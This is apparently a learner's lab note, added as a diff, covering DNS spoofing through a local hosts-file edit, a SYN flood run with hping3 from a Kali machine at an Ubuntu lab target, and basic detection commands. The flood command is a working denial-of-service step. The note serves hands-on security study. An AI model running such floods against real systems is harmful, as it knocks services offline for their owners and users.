@@ -1,0 +1,63 @@
+Day 3 — DNS Spoofing + DDoS Concepts
+
+Commands I run:
+
+DNS SPOOFING
+
+1. Edit hosts file:
+sudo nano /etc/hosts
+
+2. Add these lines:
+127.0.0.1       facebook.com
+127.0.0.1       www.facebook.com
+
+3. Save and exit:
+Ctrl + X → Y → Enter
+
+4. Test DNS spoof:
+ping facebook.com
+
+Search in browser www.facebook.com 
+Search in browser facebook.com
+
+5. Restore hosts file:
+sudo nano /etc/hosts
+# Delete the added lines
+Ctrl + X → Y → Enter
+
+
+SYN FLOOD ATTACK
+
+This Attack Starting before. I will check IP Address:-
+
+Kali IP: 192.168.1.53
+Ubuntu IP: 192.168.1.38
+
+
+6. Check victim port status (on Ubuntu victim):
+ss -tulpn | grep :80
+
+7. Install hping3 
+sudo apt install hping3 -y
+
+8. Run SYN flood attack (on Kali attacker):
+sudo hping3 -S --flood -p 80 VICTIM_IP
+
+9. Check victim logs (on Ubuntu victim):
+sudo tail -f /var/log/syslog
+
+10. Stop attack:
+Ctrl + C
+
+
+DETECTION COMMANDS
+
+11. Check network connections:
+ss -tulpn
+
+12. Check system load:
+top
+
+13. check log /var/log/syslog
+
+Date: 3 April 2026
